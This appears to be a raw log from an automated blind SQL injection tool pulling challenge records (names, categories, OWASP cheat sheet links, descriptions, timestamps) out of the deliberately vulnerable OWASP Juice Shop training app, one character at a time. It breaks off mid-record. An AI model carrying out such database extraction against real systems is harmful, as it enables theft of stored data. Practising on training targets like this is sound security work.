+[12:06:28] [INFO] retrieved:  
+[12:06:28] [INFO] retrieving the length of query output
+
+[12:06:28] [INFO] retrieved: 1
+
+[12:06:28] [INFO] retrieved: 0
+[12:06:28] [INFO] retrieving the length of query output
+
+[12:06:28] [INFO] retrieved: 2
+[12:06:29] [INFO] retrieved: __
+[12:06:29] [INFO] retrieved: 
+[12:06:29] [INFO] retrieved: 23           
+[12:06:29] [INFO] retrieved: 23
+[12:06:29] [INFO] retrieving the length of query output
+
+[12:06:29] [INFO] retrieved: 18
+[12:06:29] [INFO] retrieved: __________________
+[12:06:29] [INFO] retrieved: 
+[12:06:31] [INFO] retrieved: emailLeakChallenge             
+[12:06:31] [INFO] retrieved: emailLeakChallenge
+[12:06:31] [INFO] retrieving the length of query output
+
+[12:06:31] [INFO] retrieved: 72
+[12:06:31] [INFO] retrieved: __________________________________
+[12:06:31] [INFO] retrieved: 
+[12:06:38] [INFO] retrieved: ..tsheets/XS_Leaks_Cheat_Sheet.html             
+[12:06:39] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html
+[12:06:39] [INFO] retrieving the length of query output
+
+[12:06:39] [INFO] retrieved: 10
+[12:06:39] [INFO] retrieved: __________
+[12:06:39] [INFO] retrieved: 
+[12:06:40] [INFO] retrieved: Email Leak             
+[12:06:40] [INFO] retrieved: Email Leak
+[12:06:40] [INFO] retrieving the length of query output
+
+[12:06:40] [INFO] retrieved: 1
+
+[12:06:40] [INFO] retrieved: 0
+[12:06:40] [INFO] retrieving the length of query output
+
+[12:06:40] [INFO] retrieved:  
+
+[12:06:40] [INFO] retrieved:  
+[12:06:40] [INFO] retrieving the length of query output
+
+[12:06:40] [INFO] retrieved:  
+
+[12:06:40] [INFO] retrieved:  
+[12:06:40] [INFO] retrieving the length of query output
+
+[12:06:40] [INFO] retrieved: 30
+[12:06:41] [INFO] retrieved: ______________________________
+[12:06:41] [INFO] retrieved: 
+[12:06:44] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00             
+[12:06:44] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00
+[12:06:44] [INFO] retrieving the length of query output
+
+[12:06:44] [INFO] retrieved: 25
+[12:06:44] [INFO] retrieved: _________________________
+[12:06:44] [INFO] retrieved: 
+[12:06:47] [INFO] retrieved: Improper Input Validation             
+[12:06:47] [INFO] retrieved: Improper Input Validation
+[12:06:47] [INFO] retrieving the length of query output
+
+[12:06:47] [INFO] retrieved: 1
+
+[12:06:47] [INFO] retrieved: 0
+[12:06:47] [INFO] retrieving the length of query output
+
+[12:06:47] [INFO] retrieved: 30
+[12:06:48] [INFO] retrieved: ______________________________
+[12:06:48] [INFO] retrieved: 
+[12:06:51] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00             
+[12:06:51] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00
+[12:06:51] [INFO] retrieving the length of query output
+
+[12:06:51] [INFO] retrieved: 49
+[12:06:51] [INFO] retrieved: __________________________________
+[12:06:51] [INFO] retrieved: 
+[12:06:56] [INFO] retrieved: ..with an empty email and password.             
+[12:06:56] [INFO] retrieved: Register a user with an empty email and password.
+[12:06:56] [INFO] retrieving the length of query output
+
+[12:06:56] [INFO] retrieved: 1
+
+[12:06:56] [INFO] retrieved: 2
+[12:06:56] [INFO] retrieving the length of query output
+
+[12:06:56] [INFO] retrieved:  
+
+[12:06:56] [INFO] retrieved:  
+[12:06:57] [INFO] retrieving the length of query output
+
+[12:06:57] [INFO] retrieved: 1
+
+[12:06:57] [INFO] retrieved: 0
+[12:06:57] [INFO] retrieving the length of query output
+
+[12:06:57] [INFO] retrieved: 2
+[12:06:57] [INFO] retrieved: __
+[12:06:57] [INFO] retrieved: 
+[12:06:57] [INFO] retrieved: 24           
+[12:06:57] [INFO] retrieved: 24
+[12:06:57] [INFO] retrieving the length of query output
+
+[12:06:57] [INFO] retrieved: 21
+[12:06:57] [INFO] retrieved: _____________________
+[12:06:57] [INFO] retrieved: 
+[12:07:00] [INFO] retrieved: emptyUserRegistration             
+[12:07:00] [INFO] retrieved: emptyUserRegistration
+[12:07:00] [INFO] retrieving the length of query output
+
+[12:07:00] [INFO] retrieved: 80
+[12:07:00] [INFO] retrieved: __________________________________
+[12:07:00] [INFO] retrieved: 
+[12:07:11] [INFO] retrieved: ..Input_Validation_Cheat_Sheet.html             
+[12:07:11] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html
+[12:07:11] [INFO] retrieving the length of query output
+
+[12:07:11] [INFO] retrieved: 23
+[12:07:11] [INFO] retrieved: _______________________
+[12:07:11] [INFO] retrieved: 
+[12:07:14] [INFO] retrieved: Empty User Registration             
+[12:07:14] [INFO] retrieved: Empty User Registration
+[12:07:14] [INFO] retrieving the length of query output
+
+[12:07:14] [INFO] retrieved: 1
+
+[12:07:14] [INFO] retrieved: 0
+[12:07:14] [INFO] retrieving the length of query output
+
+[12:07:14] [INFO] retrieved:  
+
+[12:07:14] [INFO] retrieved:  
+[12:07:14] [INFO] retrieving the length of query output
+
+[12:07:14] [INFO] retrieved:  
+
+[12:07:14] [INFO] retrieved:  
+[12:07:14] [INFO] retrieving the length of query output
+
+[12:07:14] [INFO] retrieved: 30
+[12:07:15] [INFO] retrieved: ______________________________
+[12:07:15] [INFO] retrieved: 
+[12:07:18] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00             
+[12:07:18] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00
+[12:07:18] [INFO] retrieving the length of query output
+
+[12:07:18] [INFO] retrieved: 9
+[12:07:18] [INFO] retrieved: _________
+[12:07:18] [INFO] retrieved: 
+[12:07:19] [INFO] retrieved: Injection           
+[12:07:19] [INFO] retrieved: Injection
+[12:07:19] [INFO] retrieving the length of query output
+
+[12:07:19] [INFO] retrieved: 1
+
+[12:07:19] [INFO] retrieved: 0
+[12:07:19] [INFO] retrieving the length of query output
+
+[12:07:19] [INFO] retrieved: 30
+[12:07:20] [INFO] retrieved: ______________________________
+[12:07:20] [INFO] retrieved: 
+[12:07:23] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00             
+[12:07:23] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00
+[12:07:23] [INFO] retrieving the length of query output
+
+[12:07:23] [INFO] retrieved: 107
+[12:07:23] [INFO] retrieved: __________________________________
+[12:07:23] [INFO] retrieved: 
+[12:07:34] [INFO] retrieved: ..thout ever registering that user.               
+[12:07:34] [INFO] retrieved: Log in with the (non-existing) accountant <i>acc0unt4nt@juice-sh.op</i> without ever registering that user.
+[12:07:34] [INFO] retrieving the length of query output
+
+[12:07:34] [INFO] retrieved: 1
+
+[12:07:34] [INFO] retrieved: 4
+[12:07:34] [INFO] retrieving the length of query output
+
+[12:07:34] [INFO] retrieved:  
+
+[12:07:34] [INFO] retrieved:  
+[12:07:34] [INFO] retrieving the length of query output
+
+[12:07:34] [INFO] retrieved: 1
+
+[12:07:35] [INFO] retrieved: 0
+[12:07:35] [INFO] retrieving the length of query output
+
+[12:07:35] [INFO] retrieved: 2
+[12:07:35] [INFO] retrieved: __
+[12:07:35] [INFO] retrieved: 
+[12:07:35] [INFO] retrieved: 25           
+[12:07:35] [INFO] retrieved: 25
+[12:07:35] [INFO] retrieving the length of query output
+
+[12:07:35] [INFO] retrieved: 28
+[12:07:38] [INFO] retrieved: ____________________________
+[12:07:38] [INFO] retrieved: 
+[12:07:41] [INFO] retrieved: ephemeralAccountantChallenge             
+[12:07:41] [INFO] retrieved: ephemeralAccountantChallenge
+[12:07:41] [INFO] retrieving the length of query output
+
+[12:07:41] [INFO] retrieved: 88
+[12:07:41] [INFO] retrieved: __________________________________
+[12:07:41] [INFO] retrieved: 
+[12:07:50] [INFO] retrieved: ..ction_Prevention_Cheat_Sheet.html             
+[12:07:50] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
+[12:07:50] [INFO] retrieving the length of query output
+
+[12:07:50] [INFO] retrieved: 20
+[12:07:51] [INFO] retrieved: ____________________
+[12:07:51] [INFO] retrieved: 
+[12:07:53] [INFO] retrieved: Ephemeral Accountant             
+[12:07:53] [INFO] retrieved: Ephemeral Accountant
+[12:07:53] [INFO] retrieving the length of query output
+
+[12:07:53] [INFO] retrieved: 1
+
+[12:07:53] [INFO] retrieved: 0
+[12:07:53] [INFO] retrieving the length of query output
+
+[12:07:53] [INFO] retrieved:  
+
+[12:07:53] [INFO] retrieved:  
+[12:07:53] [INFO] retrieving the length of query output
+
+[12:07:53] [INFO] retrieved:  
+
+[12:07:53] [INFO] retrieved:  
+[12:07:53] [INFO] retrieving the length of query output
+
+[12:07:53] [INFO] retrieved: 30
+[12:07:53] [INFO] retrieved: ______________________________
+[12:07:53] [INFO] retrieved: 
+[12:07:57] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00             
+[12:07:57] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00
+[12:07:57] [INFO] retrieving the length of query output
+
+[12:07:57] [INFO] retrieved: 25
+[12:07:57] [INFO] retrieved: _________________________
+[12:07:57] [INFO] retrieved: 
+[12:07:59] [INFO] retrieved: Security Misconfiguration             
+[12:08:00] [INFO] retrieved: Security Misconfiguration
+[12:08:00] [INFO] retrieving the length of query output
+
+[12:08:00] [INFO] retrieved: 1
+
+[12:08:00] [INFO] retrieved: 0
+[12:08:00] [INFO] retrieving the length of query output
+
+[12:08:00] [INFO] retrieved: 30
+[12:08:00] [INFO] retrieved: ______________________________
+[12:08:00] [INFO] retrieved: 
+[12:08:03] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00             
+[12:08:03] [INFO] retrieved: 2026-05-08 08:29:59.466 +00:00
+[12:08:03] [INFO] retrieving the length of query output
+
+[12:08:03] [INFO] retrieved: 74
+[12:08:04] [INFO] retrieved: __________________________________
+[12:08:04] [INFO] retrieved: 
+[12:08:14] [INFO] retrieved: ..cefully nor consistently handled.             
+[12:08:14] [INFO] retrieved: Provoke an error that is neither very gracefully nor consistently handled.
+[12:08:14] [INFO] retrieving the length of query output
+
+[12:08:14] [INFO] retrieved: 1
+
+[12:08:14] [INFO] retrieved: 1
+[12:08:14] [INFO] retrieving the length of query output
+
+[12:08:14] [INFO] retrieved:  
+
+[12:08:14] [INFO] retrieved:  
+[12:08:15] [INFO] retrieving the length of query output
+
+[12:08:15] [INFO] retrieved: 1
+
+[12:08:15] [INFO] retrieved: 0
+[12:08:15] [INFO] retrieving the length of query output
+
+[12:08:15] [INFO] retrieved: 2
+[12:08:15] [INFO] retrieved: __
+[12:08:15] [INFO] retrieved: 
+[12:08:15] [INFO] retrieved: 26           
+[12:08:15] [INFO] retrieved: 26
+[12:08:15] [INFO] retrieving the length of query output
+
+[12:08:15] [INFO] retrieved: 22
+[12:08:15] [INFO] retrieved: ______________________
+[12:08:15] [INFO] retrieved: 
+[12:08:18] [INFO] retrieved: errorHandlingChallenge             
+[12:08:18] [INFO] retrieved: errorHandlingChallenge
+[12:08:18] [INFO] retrieving the length of query output
+
+[12:08:18] [INFO] retrieved: 78
+[12:08:18] [INFO] retrieved: __________________________________
+[12:08:18] [INFO] retrieved: 
+[12:08:26] [INFO] retrieved: ..s/Error_Handling_Cheat_Sheet.html             
+[12:08:26] [INFO] retrieved: https://cheatsheetseries.owasp.org/cheatsheets/Error_Handling_Cheat_Sheet.html
+[12:08:26] [INFO] retrieving the length of query output
+
+[12:08:26] [INFO] retrieved: 14
+[12:08:26] [INFO] retrieved: ______________
+[12:08:26] [INFO] retrieved: 
+[12:08:27] [INFO] retrieved: Error Handling             
+[12:08:28] [INFO] retrieved: Error Handling
+[12:08:28] [INFO] retrieving the length of query output
+
+[12:08:28] [INFO] retrieved: 1
+
+[12:08:28] [INFO] retrieved: 1
+[12:08:28] [INFO] retrieving the length of query output
+
+[12:08:28] [INFO] retrieved: 12
+[12:08:28] [INFO] retrieved: ____________
+[12:08:28] [INFO] retrieved: 
+[12:08:29] [INFO] retrieved: Prerequisite             
+[12:08:29] [INFO] retrieved: Prerequisite
+[12:08:29] [INFO] retrieving the length of query output
+
+[12:08:29] [INFO] retrieved:  
+
+[12:08:29] [INFO] retrieved:  
+[12:08:30] [INFO] retrieving the length of query output
+
+[12:08:30] [INFO] retrieved: 30
+[12:08:30] [INFO] retrieved: ______________________________
+[12:08:30] [INFO] retrieved: 
+[12:08:33] [INFO] retrieved: 2026-05-08 08:35:58.970 +00:00             
+[12:08:33] [INFO] retrieved: 2026-05-08 08:35:58.970 +00:00
+[12:08:33] [INFO] retrieving the length of query output
+
+[12:08:33] [INFO] retrieved: 25
+[12:08:33] [INFO] retrieved: _________________________
+[12:08:33] [INFO] retrieved: 
+[12:08:36] [INFO] retrieved: Improper Input Validation             
+[12:08:36] [INFO] retrieved: Improper Input Validation
+[12:08:36] [INFO] retrieving the length of query output
+
+[12:08:36] [INFO] retrieved: 1
+
+[12:08:36] [INFO] retrieved: 0
+[12:08:36] [INFO] retrieving the length of query output
+
+[12:08:36] [INFO] retrieved: 30
+[12:08:36] [INFO] retrieved: ______________________________
+[12:08:36] [INFO] retrieved: 
+[12:08:40] [INFO] retrieved: 2026-05-08 08:29:59.467 +00:00             
+[12:08:40] [INFO] retrieved: 2026-05-08 08:29:59.467 +00:00
+[12:08:40] [INFO] retrieving the length of query output
+
+[12:08:40] [INFO] retrieved: 52
+[12:08:40] [INFO] retrieved: __________________________________
+[12:08:40] [INFO] retrieved: 
+[12:08:45] [INFO] retrieved: .. an expired campaign coupon code.             
+[12:08:45] [INFO] retrieved: Successfully redeem an expired campaign coupon code.
+[12:08:45] [INFO] retrieving the length of query output
+
+[12:08:45] [INFO] retrieved: 1
+
+[12:08:45] [INFO] retrieved: 4
+[12:08:46] [INFO] retrieving the length of query output
+
+[12:08:46] [INFO] retrieved:  
+
+[12:08:46] [INFO] retrieved:  
+[12:08:46] [INFO] retrieving the length of query output
+
+[12:08:46] [INFO] retrieved: 1
+
+[12:08:46] [INFO] retrieved: 0
+[12:08:46] [INFO] retrieving the length of query output
+
+[12:08:46] [INFO] retrieved: 2
+[12:08:46] [INFO] retrieved: __
+[12:08:46] [INFO] retrieved: 
+[12:08:46] [INFO] retrieved: 27           
+[12:08:46] [INFO] retrieved: 27
+[12:08:46] [INFO] retrieving the length of query output
+
+[12:08:46] [INFO] retrieved: 24
+[12:08:47] [INFO] retrieved: ________________________
+[12:08:47] [INFO] retrieved: 
+[12:08:49] [INFO] retrieved: manipulateClockChallenge             
+[12:08:49] [INFO] retrieved: manipulateClockChallenge
+[12:08:49] [INFO] retrieving the length of query output
+
+[12:08:49] [INFO] retrieved:  
+
+[12:08:49] [INFO] retrieved:  
+[12:08:49] [INFO] retrieving the length of query output
+
+[12:08:49] [INFO] retrieved: 14
+[12:08:49] [INFO] retrieved: ______________
+[12:08:49] [INFO] retrieved: 
+[12:08:51] [INFO] retrieved: Expired Coupon             
+[12:08:51] [INFO] retrieved: Expired Coupon
+[12:08:51] [INFO] retrieving the length of query output
+
+[12:08:51] [INFO] retrieved: 1
+
+[12:08:51] [INFO] retrieved: 0
+[12:08:51] [INFO] retrieving the length of query output
+
+[12:08:51] [INFO] retrieved:  
+
+[12:08:51] [INFO] retrieved:  
+[12:08:52] [INFO] retrieving the length of query output
+
+[12:08:52] [INFO] retrieved:  
+
+[12:08:52] [INFO] retrieved:  
+[12:08:52] [INFO] retrieving the length of query output
+
+[12:08:52] [INFO] retrieved: 30
+[12:08:52] [INFO] retrieved: ______________________________
+[12:08:52] [INFO] retrieved: 
+[12:08:55] [INFO] retrieved: 2026-05-08 08:29:59.467 +00:00             
+[12:08:56] [INFO] retrieved: 2026-05-08 08:29:59.467 +00:00
+[12:08:56] [INFO] retrieving the length of query output
+
+[12:08:56] [INFO] retrieved: 22
+[12:08:56] [INFO] retrieved: ______________________
+[12:08:56] [INFO] retrieved: 
+[12:08:59] [INFO] retrieved: Broken Anti Automation             
+[12:08:59] [INFO] retrieved: Broken Anti Automation
+[12:08:59] [INFO] retrieving the length of query output
+
+[12:08:59] [INFO] retrieved: 1
+
+[12:08:59] [INFO] retrieved: 0
+[12:08:59] [INFO] retrieving the length of query output
+
+[12:08:59] [INFO] retrieved: 30
+[12:08:59] [INFO] retrieved: ______________________________
+[12:08:59] [INFO] retrieved: 
+[12:09:07] [INFO] retrieved: 2026-05-08 08:29:59.467 +00:00             
+[12:09:07] [INFO] retrieved: 2026-05-08 08:29:59.467 +00:00
+[12:09:07] [INFO] retrieving the length of query output
+
+[12:09:07] [INFO] retrieved: 90
+[12:09:07] [INFO] retrieved: __________________________________
+[12:09:07] [INFO] retrieved: [?1l>
